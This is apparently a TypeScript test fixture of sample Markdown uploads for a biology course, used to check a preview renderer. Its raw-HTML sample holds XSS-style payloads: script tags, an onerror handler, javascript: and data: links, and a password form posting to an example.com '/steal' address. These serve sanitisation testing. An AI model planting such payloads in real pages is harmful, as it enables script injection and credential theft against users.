/* Uploaded .md files for Biology 101 that exercise the markdown preview: a
   rich valid file, a Capy-style MDX export, raw HTML and unsafe links,
   syntax that breaks MDX, images, embed fences, and a long file. */

const richNotes = `# Cell cycle

The cell cycle has two main phases: **interphase** and the **mitotic phase**.

## Interphase

1. **G1** — the cell grows and makes proteins.
2. **S** — DNA replicates; each chromosome becomes two *sister chromatids*.
3. **G2** — the cell checks the copied DNA and prepares to divide.

> Most of a cell's life is spent in interphase.

## Mitosis

| Stage | What happens |
| --- | --- |
| Prophase | Chromatin condenses into chromosomes |
| Metaphase | Chromosomes line up at the equator |
| Anaphase | Sister chromatids pull apart |
| Telophase | Two nuclei form |

- [x] Read chapter 4
- [ ] Draw the stages
  - [ ] Label the spindle fibres

Inline math: the doubling time is $t_d = \\frac{\\ln 2}{r}$.

$$
N(t) = N_0 \\cdot 2^{t / t_d}
$$

\`\`\`python
def cells_after(hours, doubling=24):
    return 2 ** (hours / doubling)
\`\`\`

Entities: &copy; 2026, &mdash; dash, caf&eacute;, 5 &lt; 7. Emoji: :microscope: :dna:

Footnote reference[^1], ~~strikethrough~~, \`inline code\`, and a [link](https://en.wikipedia.org/wiki/Cell_cycle).

---

[^1]: Campbell Biology, chapter 12.
`;

const mdxExport = `# Photosynthesis (exported note)

<callout variant="info">
Light reactions happen in the **thylakoid membranes**.
</callout>

<column_group>
<column width="50%">

### Light reactions

- Water is split
- ATP and NADPH form

</column>
<column width="50%">

### Calvin cycle

- CO₂ is fixed
- Glucose is built

</column>
</column_group>

\`\`\`mermaid
flowchart LR
  Light --> ATP
  ATP --> Calvin[Calvin cycle]
  Calvin --> Glucose
\`\`\`
`;

const rawHtml = `# Lab report with raw HTML

Line one<br>line two, H<sub>2</sub>O and x<sup>2</sup>, press <kbd>Ctrl</kbd>.

<details>
<summary>Hidden answer</summary>

The answer is **mitochondria**.

</details>

<div style="color: red; position: fixed; inset: 0">A full-page red overlay</div>

<script>alert('script tag')</script>

<style>body { display: none }</style>

<img src="x" onerror="alert('img onerror')">

<iframe src="https://example.com"></iframe>

<a href="javascript:alert('html link')">HTML javascript link</a>

[Markdown javascript link](javascript:alert('md link'))

[Data link](data:text/html,<script>alert(1)</script>)

<form action="https://example.com/steal"><input name="password" placeholder="Password"></form>

A normal paragraph at the end.
`;

const brokenSyntax = `# Broken syntax

Curly braces in prose: the set {A, B, C} and a {stray brace.

Comparisons: a < b, b > a, and I <3 biology.

An unclosed tag <div> starts here and never ends.

**Bold that never closes

* a list item
*   with odd spacing
  * and a nested one

| a table | missing a cell |
| --- |
| 1 | 2 | 3 |

Text after the broken table.

\`\`\`js
const unterminated = "this fence never closes";
`;

const images = `# Images

A web image:

![Mitochondrion diagram](https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Animal_mitochondrion_diagram_en.svg/640px-Animal_mitochondrion_diagram_en.svg.png)

A relative image: ![local](img/cell.png)

A data image: ![tiny](data:image/gif;base64,R0lGODlhAQABAAAAACw=)

Text after the images.
`;

const embedFences = `# Embed fences

\`\`\`html-embed
<button onclick="this.textContent = 'clicked'">Click me</button>
<script>document.body.style.background = 'yellow'</script>
\`\`\`

\`\`\`quiz
this is not a valid quiz fence
\`\`\`

A paragraph after the fences.
`;

const longNotes = `# Genetics glossary (long)

${Array.from(
  { length: 400 },
  (_, index) =>
    `## Term ${index + 1}\n\n**Allele ${index + 1}** — one of the forms a gene can take; see *locus ${index + 1}*.\n\n- dominant: \`A${index}\`\n- recessive: \`a${index}\``
).join('\n\n')}
`;

export const markdownSamples = [
  { body: richNotes, id: 'bio-md-rich', name: 'Cell cycle notes.md' },
  { body: mdxExport, id: 'bio-md-mdx', name: 'Photosynthesis export.md' },
  { body: rawHtml, id: 'bio-md-html', name: 'Lab report (raw HTML).md' },
  { body: brokenSyntax, id: 'bio-md-broken', name: 'Broken syntax.md' },
  { body: images, id: 'bio-md-images', name: 'Images.md' },
  { body: embedFences, id: 'bio-md-embeds', name: 'Embed fences.md' },
  { body: longNotes, id: 'bio-md-long', name: 'Genetics glossary (long).md' },
].map((sample) => ({ ...sample, kind: 'md' as const }));
